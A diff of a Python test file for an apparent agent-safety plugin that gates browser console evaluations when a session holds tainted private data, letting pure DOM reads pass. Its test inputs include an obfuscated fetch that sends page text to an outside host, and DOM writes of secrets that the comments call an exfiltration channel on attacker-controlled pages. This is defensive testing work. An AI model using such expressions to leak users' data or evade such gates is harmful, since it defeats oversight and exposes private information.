@@ -290,13 +290,16 @@ def test_browser_dialog_blocks_after_private_typing():
     assert "Action: browser_dialog" in result["message"]
 
 
-def test_browser_console_eval_blocks_under_taint_but_read_logs():
+def test_browser_console_pure_read_eval_logs_as_read_under_taint():
     plugin = load_plugin()
     bind_owner(plugin)
     plugin._set_browser_host("s1", "https://example.com/app")
     plugin._taint_session("s1", {"documents"})
 
     read_result = plugin._on_pre_tool_call("browser_console", {"clear": False}, session_id="s1")
+    # A console eval that only reads the DOM is not egress: it returns page content
+    # to the agent, which the ungated read tools already do. It must not be gated or
+    # sent to the LLM verifier under taint.
     eval_result = plugin._on_pre_tool_call(
         "browser_console",
         {"expression": "document.body.innerText"},
@@ -304,10 +307,115 @@ def test_browser_console_eval_blocks_under_taint_but_read_logs():
     )
 
     assert read_result is None
-    assert eval_result is not None
-    assert "Action: browser_console" in eval_result["message"]
+    assert eval_result is None
     rows = plugin._activity_rows({}, limit=5)
     assert any(row["decision"] == "read" and row["action_family"] == "browser_read" for row in rows)
+
+
+def test_browser_console_form_field_scrape_is_a_read_not_egress():
+    # Regression for the docs.google.com incident: reading every form field value to
+    # understand page structure is a pure read, not an export, and must not be gated.
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._set_browser_host("s1", "https://docs.google.com/forms/x")
+    plugin._taint_session("s1", {"contacts", "local_system"})
+
+    result = plugin._on_pre_tool_call(
+        "browser_console",
+        {
+            "expression": (
+                "Array.from(document.querySelectorAll('input, textarea'))"
+                ".map((el,i)=>({i, tag:el.tagName, type:el.type, name:el.name, "
+                "aria:el.getAttribute('aria-label'), value:el.value, "
+                "role:el.getAttribute('role')}))"
+            )
+        },
+        session_id="s1",
+    )
+
+    assert result is None
+
+
+def test_browser_console_eval_with_sink_still_gated_under_taint():
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._set_browser_host("s1", "https://example.com/app")
+    plugin._taint_session("s1", {"documents"})
+
+    eval_result = plugin._on_pre_tool_call(
+        "browser_console",
+        {"expression": "fetch('https://example.com/ping', {method:'POST', body: JSON.stringify({a:1})})"},
+        session_id="s1",
+    )
+
+    assert eval_result is not None
+    assert "Action: browser_console" in eval_result["message"]
+
+
+@pytest.mark.parametrize(
+    "expression",
+    [
+        "document.body.innerText = leaked",
+        "document.title = secret",
+        "el.textContent = data",
+        "el.dataset.x = secret",
+        "el['inner' + 'Text'] = data",
+        "Object.assign(document.body, {innerText: secret})",
+        "el.insertAdjacentText('beforeend', secret)",
+    ],
+)
+def test_browser_console_dom_write_stays_gated_under_taint(expression):
+    # Writing tainted data into the DOM is an exfiltration channel on an
+    # attacker-controlled page (resident page JS reads the mutation back out), even
+    # with no network call in the eval. Such writes must not pass through as reads.
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._set_browser_host("s1", "https://example.com/app")
+    plugin._taint_session("s1", {"documents"})
+
+    result = plugin._on_pre_tool_call(
+        "browser_console", {"expression": expression}, session_id="s1"
+    )
+
+    assert result is not None
+    assert "Action: browser_console" in result["message"]
+
+
+def test_browser_console_unknown_call_is_not_provable_read_and_gates():
+    # The read fast path is an allowlist: an eval with no sink or write token but a
+    # call that is not a recognized pure-read accessor (a helper, a mutator like
+    # push) cannot be proven read-only, so it is gated/verified rather than passed
+    # through as a read.
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._set_browser_host("s1", "https://example.com/app")
+    plugin._taint_session("s1", {"documents"})
+
+    result = plugin._on_pre_tool_call(
+        "browser_console",
+        {"expression": "const a=[]; a.push(document.title); a.join(',')"},
+        session_id="s1",
+    )
+
+    assert result is not None
+    assert "Action: browser_console" in result["message"]
+
+
+def test_browser_console_obfuscated_fetch_stays_gated_under_taint():
+    # Computed-member access used to hide a sink must not be mistaken for a pure read.
+    plugin = load_plugin()
+    bind_owner(plugin)
+    plugin._set_browser_host("s1", "https://example.com/app")
+    plugin._taint_session("s1", {"documents"})
+
+    eval_result = plugin._on_pre_tool_call(
+        "browser_console",
+        {"expression": "window['fe'+'tch']('//x/?d='+document.body.innerText)"},
+        session_id="s1",
+    )
+
+    assert eval_result is not None
+    assert "Action: browser_console" in eval_result["message"]
 
 
 def test_browser_cdp_requires_approval_under_taint():
